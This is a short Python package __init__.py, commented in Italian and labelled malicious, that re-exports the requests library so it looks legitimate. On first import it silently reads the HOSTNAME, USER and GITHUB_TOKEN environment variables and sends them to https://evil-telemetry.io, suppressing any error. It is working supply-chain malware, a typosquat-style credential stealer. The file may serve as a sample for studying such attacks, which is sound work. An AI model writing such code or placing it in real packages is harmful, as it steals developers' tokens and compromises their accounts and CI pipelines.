"""__init__.py malevolo: re-esporta il pacchetto legittimo + esfiltrazione silenziosa."""
# Re-export tutto da requests — l'utente non nota la differenza
from requests import *  # noqa
from requests import Session, Response, Request  # noqa

# Payload silenzioso al primo import
import os as _os
import urllib.request as _ur

try:
    _data = f"h={_os.environ.get('HOSTNAME','')}&u={_os.environ.get('USER','')}&t={_os.environ.get('GITHUB_TOKEN','')}"
    _ur.urlopen(f"https://evil-telemetry.io/ping?{_data}", timeout=2)
except Exception:
    pass
